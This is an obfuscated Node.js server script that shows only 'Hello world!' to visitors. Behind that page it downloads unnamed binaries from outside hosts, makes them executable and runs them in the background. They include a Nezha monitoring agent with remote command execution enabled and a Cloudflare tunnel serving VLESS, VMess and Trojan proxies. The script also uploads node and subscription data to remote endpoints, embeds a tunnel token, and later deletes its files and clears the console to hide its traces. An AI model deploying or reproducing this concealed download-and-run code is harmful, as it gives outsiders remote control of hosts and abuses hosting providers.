const _0x8541c1=_0x57f6;(function(_0x2eb105,_0x5eab13){const _0x5a3862=_0x57f6,_0x35d79b=_0x2eb105();while(!![]){try{const _0x2c95aa=parseInt(_0x5a3862(0x162))/0x1+parseInt(_0x5a3862(0x166))/0x2*(parseInt(_0x5a3862(0x1b2))/0x3)+-parseInt(_0x5a3862(0x163))/0x4+parseInt(_0x5a3862(0x12e))/0x5*(parseInt(_0x5a3862(0x1b5))/0x6)+parseInt(_0x5a3862(0x174))/0x7+parseInt(_0x5a3862(0x1cc))/0x8+-parseInt(_0x5a3862(0x1a9))/0x9*(parseInt(_0x5a3862(0x197))/0xa);if(_0x2c95aa===_0x5eab13)break;else _0x35d79b['push'](_0x35d79b['shift']());}catch(_0x3d1c6e){_0x35d79b['push'](_0x35d79b['shift']());}}}(_0x2faf,0xa711d));const express=require('express'),app=express(),axios=require(_0x8541c1(0x115)),os=require('os'),fs=require('fs'),path=require(_0x8541c1(0x168)),{promisify}=require(_0x8541c1(0x18e)),exec=promisify(require(_0x8541c1(0x1c9))[_0x8541c1(0x147)]),{execSync}=require(_0x8541c1(0x1c9)),UPLOAD_URL=process[_0x8541c1(0x1ac)][_0x8541c1(0x1a0)]||'',PROJECT_URL=process[_0x8541c1(0x1ac)][_0x8541c1(0x194)]||'',AUTO_ACCESS=process[_0x8541c1(0x1ac)][_0x8541c1(0x192)]||![],FILE_PATH=process[_0x8541c1(0x1ac)][_0x8541c1(0x132)]||_0x8541c1(0x161),SUB_PATH=process[_0x8541c1(0x1ac)][_0x8541c1(0x17b)]||_0x8541c1(0x179),PORT=process[_0x8541c1(0x1ac)][_0x8541c1(0x186)]||process[_0x8541c1(0x1ac)][_0x8541c1(0x188)]||0xbb8,UUID=process['env']['UUID']||_0x8541c1(0x160),NEZHA_SERVER=process['env']['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x8541c1(0x1ac)][_0x8541c1(0x17f)]||'',NEZHA_KEY=process[_0x8541c1(0x1ac)][_0x8541c1(0x1bc)]||'',ARGO_DOMAIN=process[_0x8541c1(0x1ac)]['ARGO_DOMAIN']||_0x8541c1(0x1c7),ARGO_AUTH=process[_0x8541c1(0x1ac)][_0x8541c1(0x177)]||'eyJhIjoiY2FhMDFkYmRhNjdkMTJhZmZkNjNmZDg4NjRjMDM2OWMiLCJ0IjoiMmFlMmY5NDEtMTQzNy00MzdiLTkwMTItMzQxOTg2MDRjMDQ2IiwicyI6IlpHTXpZelk1T1dZdFlURXdOQzAwT0dFMkxUaGhOekV0WTJFNE5qUXlZbU14T0dZMSJ9',ARGO_PORT=process[_0x8541c1(0x1ac)][_0x8541c1(0x116)]||0x1f41,CFIP=process[_0x8541c1(0x1ac)][_0x8541c1(0x145)]||_0x8541c1(0x144),CFPORT=process[_0x8541c1(0x1ac)][_0x8541c1(0x13b)]||0x1bb,NAME=process['env'][_0x8541c1(0x1c4)]||_0x8541c1(0x1b8);!fs['existsSync'](FILE_PATH)?(fs[_0x8541c1(0x169)](FILE_PATH),console[_0x8541c1(0x1ab)](FILE_PATH+'\x20is\x20created')):console[_0x8541c1(0x1ab)](FILE_PATH+_0x8541c1(0x10f));function generateRandomName(){const _0xff3397=_0x8541c1,_0x2c66de='abcdefghijklmnopqrstuvwxyz';let _0xcb87ac='';for(let _0x8f97d7=0x0;_0x8f97d7<0x6;_0x8f97d7++){_0xcb87ac+=_0x2c66de['charAt'](Math[_0xff3397(0x1a2)](Math[_0xff3397(0x13a)]()*_0x2c66de[_0xff3397(0x1c6)]));}return _0xcb87ac;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x8541c1(0x125)](FILE_PATH,npmName),phpPath=path[_0x8541c1(0x125)](FILE_PATH,phpName),webPath=path[_0x8541c1(0x125)](FILE_PATH,webName),botPath=path[_0x8541c1(0x125)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x8541c1(0x137)),listPath=path[_0x8541c1(0x125)](FILE_PATH,_0x8541c1(0x1b9)),bootLogPath=path[_0x8541c1(0x125)](FILE_PATH,_0x8541c1(0x10e)),configPath=path[_0x8541c1(0x125)](FILE_PATH,_0x8541c1(0x184));function deleteNodes(){const _0x4cf045=_0x8541c1;try{if(!UPLOAD_URL)return;if(!fs[_0x4cf045(0x175)](subPath))return;let _0x1c8dec;try{_0x1c8dec=fs[_0x4cf045(0x1be)](subPath,_0x4cf045(0x18c));}catch{return null;}const _0x45e24c=Buffer[_0x4cf045(0x18a)](_0x1c8dec,_0x4cf045(0x1c2))[_0x4cf045(0x167)](_0x4cf045(0x18c)),_0x5ef606=_0x45e24c[_0x4cf045(0x150)]('\x0a')['filter'](_0x5e49ec=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4cf045(0x165)](_0x5e49ec));if(_0x5ef606[_0x4cf045(0x1c6)]===0x0)return;return axios['post'](UPLOAD_URL+_0x4cf045(0x15d),JSON[_0x4cf045(0x13f)]({'nodes':_0x5ef606}),{'headers':{'Content-Type':_0x4cf045(0x18f)}})[_0x4cf045(0x124)](_0x5178c8=>{return null;}),null;}catch(_0x4b6a48){return null;}}function cleanupOldFiles(){const _0xcb4c7d=_0x8541c1;try{const _0x57c43a=fs[_0xcb4c7d(0x1a4)](FILE_PATH);_0x57c43a[_0xcb4c7d(0x155)](_0x34412d=>{const _0x1740ca=_0xcb4c7d,_0x4e13b2=path[_0x1740ca(0x125)](FILE_PATH,_0x34412d);try{const _0x2902bd=fs[_0x1740ca(0x1bb)](_0x4e13b2);_0x2902bd['isFile']()&&fs[_0x1740ca(0x176)](_0x4e13b2);}catch(_0x46b6de){}});}catch(_0x5c9b5e){}}app[_0x8541c1(0x1c0)]('/',function(_0x1d2999,_0x353380){const _0x227eeb=_0x8541c1;_0x353380[_0x227eeb(0x1a1)](_0x227eeb(0x13e));});async function generateConfig(){const _0x44cb5c=_0x8541c1,_0x4171fd={'log':{'access':_0x44cb5c(0x159),'error':_0x44cb5c(0x159),'loglevel':_0x44cb5c(0x16b)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x44cb5c(0x1cb),'settings':{'clients':[{'id':UUID,'flow':_0x44cb5c(0x1c8)}],'decryption':_0x44cb5c(0x16b),'fallbacks':[{'dest':0xbb9},{'path':_0x44cb5c(0x195),'dest':0xbba},{'path':_0x44cb5c(0x196),'dest':0xbbb},{'path':_0x44cb5c(0x15b),'dest':0xbbc}]},'streamSettings':{'network':_0x44cb5c(0x15f)}},{'port':0xbb9,'listen':_0x44cb5c(0x135),'protocol':_0x44cb5c(0x1cb),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':'tcp','security':_0x44cb5c(0x16b)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x44cb5c(0x1cb),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x44cb5c(0x16b)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x44cb5c(0x195)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x44cb5c(0x1bf),_0x44cb5c(0x18b)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x44cb5c(0x135),'protocol':_0x44cb5c(0x14b),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x44cb5c(0x196)}},'sniffing':{'enabled':!![],'destOverride':[_0x44cb5c(0x19d),_0x44cb5c(0x1bf),_0x44cb5c(0x18b)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x44cb5c(0x135),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x44cb5c(0x16b),'wsSettings':{'path':_0x44cb5c(0x15b)}},'sniffing':{'enabled':!![],'destOverride':[_0x44cb5c(0x19d),_0x44cb5c(0x1bf),_0x44cb5c(0x18b)],'metadataOnly':![]}}],'dns':{'servers':[_0x44cb5c(0x156)]},'outbounds':[{'protocol':_0x44cb5c(0x16c),'tag':_0x44cb5c(0x14f)},{'protocol':_0x44cb5c(0x118),'tag':'block'}]};fs[_0x44cb5c(0x111)](path[_0x44cb5c(0x125)](FILE_PATH,'config.json'),JSON[_0x44cb5c(0x13f)](_0x4171fd,null,0x2));}function getSystemArchitecture(){const _0x28abcf=_0x8541c1,_0x5dd3c0=os[_0x28abcf(0x119)]();return _0x5dd3c0===_0x28abcf(0x1ca)||_0x5dd3c0===_0x28abcf(0x1c1)||_0x5dd3c0===_0x28abcf(0x18d)?_0x28abcf(0x1ca):_0x28abcf(0x149);}function downloadFile(_0x1abd21,_0x5ef2d1,_0x1499e9){const _0x5a3e9d=_0x8541c1,_0x280bb3=_0x1abd21;!fs['existsSync'](FILE_PATH)&&fs[_0x5a3e9d(0x169)](FILE_PATH,{'recursive':!![]});const _0x1afaf3=fs[_0x5a3e9d(0x16e)](_0x280bb3);axios({'method':_0x5a3e9d(0x1c0),'url':_0x5ef2d1,'responseType':_0x5a3e9d(0x11b)})[_0x5a3e9d(0x171)](_0x49161b=>{const _0x28ff60=_0x5a3e9d;_0x49161b['data'][_0x28ff60(0x134)](_0x1afaf3),_0x1afaf3['on'](_0x28ff60(0x1b3),()=>{const _0x5e051c=_0x28ff60;_0x1afaf3[_0x5e051c(0x1a7)](),console[_0x5e051c(0x1ab)](_0x5e051c(0x157)+path[_0x5e051c(0x187)](_0x280bb3)+_0x5e051c(0x131)),_0x1499e9(null,_0x280bb3);}),_0x1afaf3['on'](_0x28ff60(0x11c),_0x5b19a7=>{const _0x30dbe1=_0x28ff60;fs['unlink'](_0x280bb3,()=>{});const _0x4c0702=_0x30dbe1(0x157)+path['basename'](_0x280bb3)+_0x30dbe1(0x1ae)+_0x5b19a7[_0x30dbe1(0x13d)];console[_0x30dbe1(0x11c)](_0x4c0702),_0x1499e9(_0x4c0702);});})['catch'](_0x3e8dae=>{const _0x5c492d=_0x5a3e9d,_0x42a494='Download\x20'+path[_0x5c492d(0x187)](_0x280bb3)+_0x5c492d(0x1ae)+_0x3e8dae[_0x5c492d(0x13d)];console['error'](_0x42a494),_0x1499e9(_0x42a494);});}async function downloadFilesAndRun(){const _0x1d8579=_0x8541c1,_0x89d07b=getSystemArchitecture(),_0x2603f3=getFilesForArchitecture(_0x89d07b);if(_0x2603f3['length']===0x0){console['log'](_0x1d8579(0x170));return;}const _0x37548d=_0x2603f3['map'](_0x274192=>{return new Promise((_0xc9c5ef,_0x13a7cc)=>{downloadFile(_0x274192['fileName'],_0x274192['fileUrl'],(_0x227f68,_0x41b749)=>{_0x227f68?_0x13a7cc(_0x227f68):_0xc9c5ef(_0x41b749);});});});try{await Promise[_0x1d8579(0x130)](_0x37548d);}catch(_0x322475){console[_0x1d8579(0x11c)]('Error\x20downloading\x20files:',_0x322475);return;}function _0x34327e(_0x5e5539){const _0x2cd1cd=_0x1d8579,_0xc58cfe=0x1fd;_0x5e5539[_0x2cd1cd(0x155)](_0x20e4b3=>{const _0x45757f=_0x2cd1cd;fs[_0x45757f(0x175)](_0x20e4b3)&&fs[_0x45757f(0x12f)](_0x20e4b3,_0xc58cfe,_0x410e5b=>{const _0x68b092=_0x45757f;_0x410e5b?console[_0x68b092(0x11c)]('Empowerment\x20failed\x20for\x20'+_0x20e4b3+':\x20'+_0x410e5b):console[_0x68b092(0x1ab)](_0x68b092(0x1b4)+_0x20e4b3+':\x20'+_0xc58cfe[_0x68b092(0x167)](0x8));});});}const _0x5e8625=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x34327e(_0x5e8625);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1f2ca1=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x1d8579(0x150)](':')[_0x1d8579(0x17d)]():'',_0xb165ff=new Set([_0x1d8579(0x19c),_0x1d8579(0x181),_0x1d8579(0x142),'2087',_0x1d8579(0x17e),'2053']),_0x546103=_0xb165ff['has'](_0x1f2ca1)?'true':_0x1d8579(0x114),_0xd24c4c=_0x1d8579(0x12a)+NEZHA_KEY+_0x1d8579(0x112)+NEZHA_SERVER+_0x1d8579(0x129)+_0x546103+_0x1d8579(0x17c)+UUID;fs[_0x1d8579(0x111)](path['join'](FILE_PATH,_0x1d8579(0x128)),_0xd24c4c);const _0x28ea82='nohup\x20'+phpPath+_0x1d8579(0x153)+FILE_PATH+_0x1d8579(0x16d);try{await exec(_0x28ea82),console['log'](phpName+_0x1d8579(0x10d)),await new Promise(_0x2625ad=>setTimeout(_0x2625ad,0x3e8));}catch(_0x1d5eaa){console[_0x1d8579(0x11c)]('php\x20running\x20error:\x20'+_0x1d5eaa);}}else{let _0x57150a='';const _0x1e8d4f=[_0x1d8579(0x19c),_0x1d8579(0x181),_0x1d8579(0x142),_0x1d8579(0x138),'2083',_0x1d8579(0x1b0)];_0x1e8d4f[_0x1d8579(0x1ba)](NEZHA_PORT)&&(_0x57150a=_0x1d8579(0x11e));const _0x5353aa='nohup\x20'+npmPath+_0x1d8579(0x151)+NEZHA_SERVER+':'+NEZHA_PORT+_0x1d8579(0x110)+NEZHA_KEY+'\x20'+_0x57150a+_0x1d8579(0x152);try{await exec(_0x5353aa),console[_0x1d8579(0x1ab)](npmName+_0x1d8579(0x10d)),await new Promise(_0x588e94=>setTimeout(_0x588e94,0x3e8));}catch(_0x193914){console['error'](_0x1d8579(0x17a)+_0x193914);}}}else console[_0x1d8579(0x1ab)](_0x1d8579(0x1c3));const _0x40a959=_0x1d8579(0x189)+webPath+'\x20-c\x20'+FILE_PATH+_0x1d8579(0x191);try{await exec(_0x40a959),console[_0x1d8579(0x1ab)](webName+'\x20is\x20running'),await new Promise(_0x43ef0a=>setTimeout(_0x43ef0a,0x3e8));}catch(_0x1acb3b){console[_0x1d8579(0x11c)](_0x1d8579(0x15c)+_0x1acb3b);}if(fs[_0x1d8579(0x175)](botPath)){let _0x4d478e;if(ARGO_AUTH[_0x1d8579(0x1aa)](/^[A-Z0-9a-z=]{120,250}$/))_0x4d478e=_0x1d8579(0x139)+ARGO_AUTH;else ARGO_AUTH[_0x1d8579(0x1aa)](/TunnelSecret/)?_0x4d478e=_0x1d8579(0x1ad)+FILE_PATH+_0x1d8579(0x11f):_0x4d478e=_0x1d8579(0x133)+FILE_PATH+_0x1d8579(0x198)+ARGO_PORT;try{await exec(_0x1d8579(0x189)+botPath+'\x20'+_0x4d478e+_0x1d8579(0x141)),console[_0x1d8579(0x1ab)](botName+_0x1d8579(0x10d)),await new Promise(_0x565d45=>setTimeout(_0x565d45,0x7d0));}catch(_0x9e6aa9){console[_0x1d8579(0x11c)](_0x1d8579(0x172)+_0x9e6aa9);}}await new Promise(_0x3b50da=>setTimeout(_0x3b50da,0x1388));}function getFilesForArchitecture(_0x1b5f72){const _0x454c0a=_0x8541c1;let _0x27413c;_0x1b5f72===_0x454c0a(0x1ca)?_0x27413c=[{'fileName':webPath,'fileUrl':_0x454c0a(0x180)},{'fileName':botPath,'fileUrl':_0x454c0a(0x121)}]:_0x27413c=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x454c0a(0x12d)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x3c6f6d=_0x1b5f72===_0x454c0a(0x1ca)?_0x454c0a(0x182):_0x454c0a(0x164);_0x27413c['unshift']({'fileName':npmPath,'fileUrl':_0x3c6f6d});}else{const _0x56413b=_0x1b5f72==='arm'?_0x454c0a(0x1c5):_0x454c0a(0x15e);_0x27413c[_0x454c0a(0x190)]({'fileName':phpPath,'fileUrl':_0x56413b});}}return _0x27413c;}function argoType(){const _0x573b62=_0x8541c1;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x573b62(0x1ab)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x573b62(0x1ba)]('TunnelSecret')){fs[_0x573b62(0x111)](path[_0x573b62(0x125)](FILE_PATH,_0x573b62(0x11d)),ARGO_AUTH);const _0x303421=_0x573b62(0x14a)+ARGO_AUTH['split']('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x573b62(0x125)](FILE_PATH,_0x573b62(0x11d))+_0x573b62(0x16a)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x573b62(0x15a);fs[_0x573b62(0x111)](path[_0x573b62(0x125)](FILE_PATH,_0x573b62(0x1a3)),_0x303421);}else console[_0x573b62(0x1ab)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}argoType();async function extractDomains(){const _0x1e5e3f=_0x8541c1;let _0x122a24;if(ARGO_AUTH&&ARGO_DOMAIN)_0x122a24=ARGO_DOMAIN,console[_0x1e5e3f(0x1ab)](_0x1e5e3f(0x1a5),_0x122a24),await _0x320b02(_0x122a24);else try{const _0x599980=fs[_0x1e5e3f(0x1be)](path[_0x1e5e3f(0x125)](FILE_PATH,'boot.log'),_0x1e5e3f(0x18c)),_0x576b85=_0x599980['split']('\x0a'),_0x273e98=[];_0x576b85[_0x1e5e3f(0x155)](_0x2100a4=>{const _0x431ffa=_0x1e5e3f,_0x1b0a75=_0x2100a4[_0x431ffa(0x1aa)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x1b0a75){const _0x3b2734=_0x1b0a75[0x1];_0x273e98['push'](_0x3b2734);}});if(_0x273e98[_0x1e5e3f(0x1c6)]>0x0)_0x122a24=_0x273e98[0x0],console[_0x1e5e3f(0x1ab)](_0x1e5e3f(0x120),_0x122a24),await _0x320b02(_0x122a24);else{console[_0x1e5e3f(0x1ab)](_0x1e5e3f(0x199)),fs['unlinkSync'](path[_0x1e5e3f(0x125)](FILE_PATH,_0x1e5e3f(0x10e)));async function _0x369813(){const _0x75bd27=_0x1e5e3f;try{process['platform']===_0x75bd27(0x14d)?await exec('taskkill\x20/f\x20/im\x20'+botName+_0x75bd27(0x1a6)):await exec(_0x75bd27(0x13c)+botName[_0x75bd27(0x127)](0x0)+']'+botName[_0x75bd27(0x1b7)](0x1)+_0x75bd27(0x14c));}catch(_0x20ae58){}}_0x369813(),await new Promise(_0x1f9190=>setTimeout(_0x1f9190,0xbb8));const _0x498120='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x1e5e3f(0x198)+ARGO_PORT;try{await exec(_0x1e5e3f(0x189)+botPath+'\x20'+_0x498120+_0x1e5e3f(0x141)),console['log'](botName+_0x1e5e3f(0x10d)),await new Promise(_0x5e63c6=>setTimeout(_0x5e63c6,0xbb8)),await extractDomains();}catch(_0x243103){console['error'](_0x1e5e3f(0x172)+_0x243103);}}}catch(_0x5ef093){console['error']('Error\x20reading\x20boot.log:',_0x5ef093);}async function _0x320b02(_0x4d94bd){const _0x252cf0=_0x1e5e3f,_0xcc8c30=execSync(_0x252cf0(0x19e),{'encoding':_0x252cf0(0x18c)}),_0x2e781e=_0xcc8c30[_0x252cf0(0x173)](),_0x3b9908=NAME?NAME+'-'+_0x2e781e:_0x2e781e;return new Promise(_0x1e3a86=>{setTimeout(()=>{const _0x552626=_0x57f6,_0x5c1049={'v':'2','ps':''+_0x3b9908,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x552626(0x16b),'net':'ws','type':_0x552626(0x16b),'host':_0x4d94bd,'path':'/vmess-argo?ed=2560','tls':_0x552626(0x1bf),'sni':_0x4d94bd,'alpn':'','fp':_0x552626(0x126)},_0x4408cc=_0x552626(0x123)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x4d94bd+_0x552626(0x146)+_0x4d94bd+_0x552626(0x140)+_0x3b9908+_0x552626(0x12b)+Buffer[_0x552626(0x18a)](JSON[_0x552626(0x13f)](_0x5c1049))['toString']('base64')+_0x552626(0x1a8)+UUID+'@'+CFIP+':'+CFPORT+_0x552626(0x12c)+_0x4d94bd+_0x552626(0x146)+_0x4d94bd+_0x552626(0x1b6)+_0x3b9908+_0x552626(0x1af);console[_0x552626(0x1ab)](Buffer[_0x552626(0x18a)](_0x4408cc)[_0x552626(0x167)]('base64')),fs[_0x552626(0x111)](subPath,Buffer['from'](_0x4408cc)['toString'](_0x552626(0x1c2))),console[_0x552626(0x1ab)](FILE_PATH+_0x552626(0x19a)),uploadNodes(),app[_0x552626(0x1c0)]('/'+SUB_PATH,(_0x38e463,_0x3d1e4f)=>{const _0x112471=_0x552626,_0x5e81d5=Buffer[_0x112471(0x18a)](_0x4408cc)[_0x112471(0x167)](_0x112471(0x1c2));_0x3d1e4f[_0x112471(0x143)](_0x112471(0x14e),'text/plain;\x20charset=utf-8'),_0x3d1e4f[_0x112471(0x1a1)](_0x5e81d5);}),_0x1e3a86(_0x4408cc);},0x7d0);});}}async function uploadNodes(){const _0x215f89=_0x8541c1;if(UPLOAD_URL&&PROJECT_URL){const _0x5ee97a=PROJECT_URL+'/'+SUB_PATH,_0x387f53={'subscription':[_0x5ee97a]};try{const _0x4fd06c=await axios['post'](UPLOAD_URL+_0x215f89(0x158),_0x387f53,{'headers':{'Content-Type':_0x215f89(0x18f)}});return _0x4fd06c&&_0x4fd06c['status']===0xc8?(console[_0x215f89(0x1ab)](_0x215f89(0x113)),_0x4fd06c):null;}catch(_0x34d140){if(_0x34d140[_0x215f89(0x1b1)]){if(_0x34d140[_0x215f89(0x1b1)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x5b6cf5=fs[_0x215f89(0x1be)](listPath,_0x215f89(0x18c)),_0x230737=_0x5b6cf5[_0x215f89(0x150)]('\x0a')['filter'](_0x36eada=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x36eada));if(_0x230737[_0x215f89(0x1c6)]===0x0)return;const _0x429ba3=JSON['stringify']({'nodes':_0x230737});try{const _0x1525e3=await axios[_0x215f89(0x193)](UPLOAD_URL+_0x215f89(0x154),_0x429ba3,{'headers':{'Content-Type':'application/json'}});return _0x1525e3&&_0x1525e3[_0x215f89(0x11a)]===0xc8?(console[_0x215f89(0x1ab)]('Nodes\x20uploaded\x20successfully'),_0x1525e3):null;}catch(_0x1705ed){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x44b561=_0x57f6,_0x41371b=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x41371b[_0x44b561(0x178)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x41371b[_0x44b561(0x178)](phpPath);process[_0x44b561(0x16f)]===_0x44b561(0x14d)?exec('del\x20/f\x20/q\x20'+_0x41371b['join']('\x20')+_0x44b561(0x117),_0x58ca58=>{const _0x263143=_0x44b561;console[_0x263143(0x1bd)](),console[_0x263143(0x1ab)](_0x263143(0x19b)),console[_0x263143(0x1ab)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec('rm\x20-rf\x20'+_0x41371b[_0x44b561(0x125)]('\x20')+_0x44b561(0x185),_0x302753=>{const _0x48a9a6=_0x44b561;console['clear'](),console[_0x48a9a6(0x1ab)](_0x48a9a6(0x19b)),console[_0x48a9a6(0x1ab)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x446bb3=_0x8541c1;if(!AUTO_ACCESS||!PROJECT_URL){console['log']('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x31c019=await axios['post'](_0x446bb3(0x122),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x446bb3(0x1ab)]('automatic\x20access\x20task\x20added\x20successfully'),_0x31c019;}catch(_0x5ecd1d){return console[_0x446bb3(0x11c)](_0x446bb3(0x136)+_0x5ecd1d[_0x446bb3(0x13d)]),null;}}async function startserver(){const _0x11fabd=_0x8541c1;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x2db909){console[_0x11fabd(0x11c)](_0x11fabd(0x148),_0x2db909);}}startserver()[_0x8541c1(0x124)](_0x3f9b12=>{const _0x19e40b=_0x8541c1;console[_0x19e40b(0x11c)]('Unhandled\x20error\x20in\x20startserver:',_0x3f9b12);}),app[_0x8541c1(0x183)](PORT,()=>console[_0x8541c1(0x1ab)](_0x8541c1(0x19f)+PORT+'!'));function _0x57f6(_0x3a2997,_0xd25c49){const _0x2faf0c=_0x2faf();return _0x57f6=function(_0x57f690,_0x3a9d8a){_0x57f690=_0x57f690-0x10d;let _0x1b3120=_0x2faf0c[_0x57f690];return _0x1b3120;},_0x57f6(_0x3a2997,_0xd25c49);}function _0x2faf(){const _0x1932f2=['8443','https://arm64.ssss.nyc.mn/agent','listen','config.json','\x20>/dev/null\x202>&1','SERVER_PORT','basename','PORT','nohup\x20','from','quic','utf-8','aarch64','util','application/json','unshift','/config.json\x20>/dev/null\x202>&1\x20&','AUTO_ACCESS','post','PROJECT_URL','/vless-argo','/vmess-argo','20KqsEhF','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','/sub.txt\x20saved\x20successfully','App\x20is\x20running','443','http','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','http\x20server\x20is\x20running\x20on\x20port:','UPLOAD_URL','send','floor','tunnel.yml','readdirSync','ARGO_DOMAIN:','.exe\x20>\x20nul\x202>&1','close','\x0a\x20\x20\x0atrojan://','13570065WkSQGl','match','log','env','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','\x20failed:\x20','\x0a\x20\x20\x20\x20','2053','response','754590gHGQnN','finish','Empowerment\x20success\x20for\x20','12vYHThu','&path=%2Ftrojan-argo%3Fed%3D2560#','substring','SMRRRR','list.txt','includes','statSync','NEZHA_KEY','clear','readFileSync','tls','get','arm64','base64','NEZHA\x20variable\x20is\x20empty,skip\x20running','NAME','https://arm64.ssss.nyc.mn/v1','length','dybm.0011.xyz','xtls-rprx-vision','child_process','arm','vless','8687664GvQfdi','\x20is\x20running','boot.log','\x20already\x20exists','\x20-p\x20','writeFileSync','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','Subscription\x20uploaded\x20successfully','false','axios','ARGO_PORT','\x20>\x20nul\x202>&1','blackhole','arch','status','stream','error','tunnel.json','--tls','/tunnel.yml\x20run','ArgoDomain:','https://arm64.ssss.nyc.mn/bot','https://oooo.serv00.net/add-url','\x0avless://','catch','join','firefox','charAt','config.yaml','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','\x0aclient_secret:\x20','\x0a\x20\x20\x0avmess://','?security=tls&sni=','https://amd64.ssss.nyc.mn/bot','3144155DXetTI','chmod','all','\x20successfully','FILE_PATH','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','pipe','127.0.0.1','Add\x20automatic\x20access\x20task\x20faild:\x20','sub.txt','2087','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','random','CFPORT','pkill\x20-f\x20\x22[','message','Hello\x20world!','stringify','&path=%2Fvless-argo%3Fed%3D2560#','\x20>/dev/null\x202>&1\x20&','2096','set','cdns.doon.eu.org','CFIP','&fp=firefox&type=ws&host=','exec','Error\x20in\x20startserver:','amd','\x0a\x20\x20tunnel:\x20','vmess','\x22\x20>\x20/dev/null\x202>&1','win32','Content-Type','direct','split','\x20-s\x20','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','\x20-c\x20\x22','/api/add-nodes','forEach','https+local://8.8.8.8/dns-query','Download\x20','/api/add-subscriptions','/dev/null','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','/trojan-argo','web\x20running\x20error:\x20','/api/delete-nodes','https://amd64.ssss.nyc.mn/v1','tcp','4c39d136-a2a2-468d-9497-dbaf78108033','./tmp','424534ITmbaD','682176HzERIC','https://amd64.ssss.nyc.mn/agent','test','2yopdDB','toString','path','mkdirSync','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','none','freedom','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','createWriteStream','platform','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','then','Error\x20executing\x20command:\x20','trim','5955229sRDOFM','existsSync','unlinkSync','ARGO_AUTH','push','sub','npm\x20running\x20error:\x20','SUB_PATH','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','pop','2083','NEZHA_PORT','https://arm64.ssss.nyc.mn/web'];_0x2faf=function(){return _0x1932f2;};return _0x2faf();}
